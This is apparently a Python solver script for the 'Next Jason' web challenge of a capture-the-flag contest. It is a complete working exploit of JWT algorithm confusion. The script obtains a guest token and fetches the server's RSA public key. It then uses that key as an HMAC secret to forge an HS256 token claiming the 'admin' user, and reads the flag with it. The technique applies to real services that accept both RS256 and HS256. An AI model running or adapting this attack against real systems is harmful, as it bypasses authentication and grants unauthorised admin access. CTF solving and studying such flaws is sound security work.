#!/usr/bin/env python3
"""
Null CTF 2025 - Next Jason
Category: Web

Vulnerability: JWT Algorithm Confusion
- Server signs tokens with RS256 (asymmetric)
- Verification accepts both RS256 and HS256
- Public key is exposed via /api/getPublicKey
- Attack: Forge token with HS256 using public key as HMAC secret
"""

import requests
import sys
from jwcrypto import jwt, jwk
import base64

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://192.168.4.205:3000"

def get_public_key(session):
    """Fetch the public key from /api/getPublicKey"""
    # First get a valid guest token (bypasses middleware)
    resp = session.post(f"{BASE_URL}/token/sign", json={"username": "guest"})
    guest_token = resp.json()["token"]

    # Set it as cookie
    session.cookies.set("token", guest_token)

    # Now fetch public key
    return session.get(f"{BASE_URL}/api/getPublicKey")


def forge_admin_token(public_key):
    # Create symmetric key from public key bytes
    key = jwk.JWK(kty="oct", k=base64.urlsafe_b64encode(public_key.encode()).decode().rstrip("="))  # base64url encoded public key

    # Create and sign token
    token = jwt.JWT(header={"alg": "HS256"}, claims={"username": "admin"})
    token.make_signed_token(key)
    return token.serialize()


def get_flag(session, token):
    """Fetch flag from /api/getFlag using forged token"""
    session.cookies.set("token", token)
    flag = session.get(f"{BASE_URL}/api/getFlag").json()["flag"]
    return flag


def main():
    # Step 0: Initialize session
    session = requests.Session()

    # Step 1: Get public key
    public_key = get_public_key(session).json()["PUBKEY"]

    # Step 2: Forge admin token with HS256
    token = forge_admin_token(public_key)

    # Step 3: Get flag
    flag = get_flag(session, token)
    print(f'Flag: {flag}')


if __name__ == "__main__":
    main()
